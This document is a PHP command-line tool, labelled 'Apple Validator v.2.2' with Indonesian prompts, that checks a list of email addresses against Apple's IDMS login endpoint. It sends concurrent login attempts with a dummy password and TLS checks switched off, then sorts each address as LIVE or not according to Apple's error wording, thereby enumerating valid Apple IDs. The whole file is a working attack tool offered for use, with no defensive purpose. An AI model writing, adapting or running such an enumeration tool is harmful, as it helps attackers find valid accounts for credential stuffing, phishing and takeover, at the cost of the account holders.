<?php
ini_set("memory_limit", '-1');
date_default_timezone_set('Asia/Jakarta');
define("OS", strtolower(PHP_OS));
banner();

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

menu:
echo "1. Apple Validator v.2.2\n";
echo color()["WH"]."\nPilih : ";
$menu = trim(fgets(STDIN));
if ($menu== "1"){
require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

enterlist:
$listname = readline("SELECT LIST : ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] LIST TIDAK TERSEDIA".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] LIST TIDAK TERSEDIA".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline("SIMPAN HASIL : ");
$dir = empty($savedir) ? "HASIL" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline("SELECT RATIO 50 : ");
echo PHP_EOL;
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if($reqemail > 80) {
	echo "[!] max 80".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Minimail 2".PHP_EOL;
	goto reqemail;
}
$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$c = 0;
$page = curl("https://idmsac.apple.com/IDMSWebAuth/login?appIdKey=a8e6898f98d57e026a55acd93cd5af1ca6ff66588b0c9fa54347c3ade7f1cf3e&rv=10&path=%2Fus_qpromo_23029%2Fshop%2Fsentry%2Fauth%3Fc%3DaHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ%26r%3DSCDHYHP7CY4H9XK2H%26s%3DaHR0cHM6Ly9lcHAuYXBwbGUuY29tL3VzX3Fwcm9tb18yMzAyOS9zaG9wL3dhdGNoL2JhbmRzP3NpZ25pbj10cnVlfDFhb3M4ZjQ2ZTg0ZWVjMDgzOTlkYzNkMTI1NDQyNzI3NDk0MGFlYjA5YjMy&language=US-EN");
//$cookies = fetchCurlCookies($page);
$scnt = fetch_value($page,'name="scnt" value="','"');
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$data = 'openiForgotInNewWindow=false&fdcBrowserData=%7B%22U%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F79.0.3945.88+Safari%2F537.36%22%2C%22L%22%3A%22id-ID%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22.8a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVglE4Ww.GEFF0Yz3ccbbJYMLgiPFU77qZoOSix5ezdstlYysrhsui6HxfTPTkIOxTjhO3f9p_nH1u_eH3BhxUC550ialT0iakA2zGUMnGWFfwMHDCQyFA2wv4qnvtCsABIlNU.3Io3.Nzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWojPrabg3qUMfvLG9mhORoVjhDk1wyjftckvIhIDKIE9XXTneNufuyPBDjaY2ftckuyPB884akHGOg4C92gdHHdua2TLwdk2_AITciPJtW2Rc7LDmoNv_IU.4I5.9a44D9ctG2htFOautdISFQ_01lp.kl1BNlY6RjJNlY5QB4bVNjMk.DmJ%22%7D&appleId='.$email.'&accountPassword=1&appIdKey=a8e6898f98d57e026a55acd93cd5af1ca6ff66588b0c9fa54347c3ade7f1cf3e&accNameLocked=false&language=US-EN&path=%2Fus_qpromo_23029%2Fshop%2Fsentry%2Fauth%3Fc%3DaHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ%26r%3DSCDHYHP7CY4H9XK2H%26s%3DaHR0cHM6Ly9lcHAuYXBwbGUuY29tL3VzX3Fwcm9tb18yMzAyOS9zaG9wL3dhdGNoL2JhbmRzP3NpZ25pbj10cnVlfDFhb3M4ZjQ2ZTg0ZWVjMDgzOTlkYzNkMTI1NDQyNzI3NDk0MGFlYjA5YjMy&rv=10&requestUri=%2Flogin&Env=PROD&scnt='.$scnt.'&clientInfo=%7B%22U%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F79.0.3945.88+Safari%2F537.36%22%2C%22L%22%3A%22id-ID%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22s0a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVglE4Ww.GEFF0Yz3ccbbJYMLgiPFU77qZoOSix5ezdstlYysrhsui6HxfTPTkIOxTjhO3f9p_nH1u_eH3BhxUC550ialT0iakA2zGUMnGWFfwMHDCQyFA2wv4qnvtCsABIlNU.3Io3.Nzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWojPrabg3qUMfvLG9mhORoVjhDk1wyjftckvIhIDKIE9XXTneNufuyPBDjaY2ftckuyPB884akHGOg4C92gdHHduVKTLwdk2_AITciPJtW2Rc7LDmoNvmrk0JlV1dWGIXeDJFvTJ5OiiPJrJ5tFFgSFBBFY5BNlrAp5BNlan0Os5Apw.B4.%22%7D';
 $headers = array();
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://idmsac.apple.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Referer: https://idmsac.apple.com/IDMSWebAuth/login?appIdKey=a8e6898f98d57e026a55acd93cd5af1ca6ff66588b0c9fa54347c3ade7f1cf3e&rv=10&path=%2Fus_qpromo_23029%2Fshop%2Fsentry%2Fauth%3Fc%3DaHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ%26r%3DSCDHYHP7CY4H9XK2H%26s%3DaHR0cHM6Ly9lcHAuYXBwbGUuY29tL3VzX3Fwcm9tb18yMzAyOS9zaG9wL3dhdGNoL2JhbmRzP3NpZ25pbj10cnVlfDFhb3M4ZjQ2ZTg0ZWVjMDgzOTlkYzNkMTI1NDQyNzI3NDk0MGFlYjA5YjMy&language=US-EN';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://idmsac.apple.com/IDMSWebAuth/authenticate?jembot=$email", $data, $headers);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no, $total, $live, $die, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["jembot"];
	$x = $request->getResponseText();
	echo "[".$no."/".$total."]-[".date("H:i:s")."]";
	if (inStr($x, 'Your Apple ID or password was entered incorrectly')) {
	$die++;
		file_put_contents("unknown.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["RED"]." unknown".color()["RED"]." => ".$email;
	}else  if (inStr($x, 'Access denied. Your account does not have permission to access this application')) {
	$live++;
		file_put_contents("LIVE.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GR"]."   LIVE ".color()["GR"]."    => ".$email;
	} else {
	$unknown++;
		file_put_contents(" DIE.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["PUR"]."       NO             ".color()["WH"]."    => ".$email;
	}
	
    echo "";
    
    echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
system('clear');
echo PHP_EOL."-- Checking Done --\n-- Total: ".$total." - Live: ".$live." - Die: ".$die." - Unknown: ".$unknown." Saved to dir \"".$dir."\" -- \n".PHP_EOL;
}
else if ($menu== "2"){
echo "Coomingsoon\n" ;
}
else if (empty($menu)){
    echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Boleh Kosong";
   	goto menu;
	}
else{
	echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Dikenali";
	goto menu;
	}
function banner(){
	echo color()["RED"]."==============================================================\n";
	echo color()["CY"]."                 INDONESIA PUNYA CERITA \n";
	echo color()["CY"]."               KITA SEMUA ADALAH KELUARGA \n";
	echo color()["CY"]."                 MARHABAN YA RAMADHAN \n";
    echo color()["RED"]."\n==============================================================\n";
    echo color()["WH"]."\n";
    }    

function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"RED" => (OS == "linux" ? "\e[1;31m" : ""),
		"PUR" => (OS == "linux" ? "\e[0;35m" : ""),
		"LPUR" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LGR" => (OS == "linux" ? "\e[1;32m" : ""),
		"GR" => (OS == "linux" ? "\e[0;32m" : "")
		
	);
}
function fetch_value($str,$find_start,$find_end) {
        $start = @strpos($str,$find_start);
        if ($start === false) {
        return "";
        }
        $length = strlen($find_start);
        $end    = strpos(substr($str,$start +$length),$find_end);
        return trim(substr($str,$start +$length,$end));
        }
        function curl($url) {
    $ch = curl_init();
    $cookiefile = dirname(__FILE__)."/../appleval.cook";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_FRESH_CONNECT , 0);
	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiefile);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiefile); 
	curl_setopt($ch, CURLOPT_FRESH_CONNECT , 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
    }

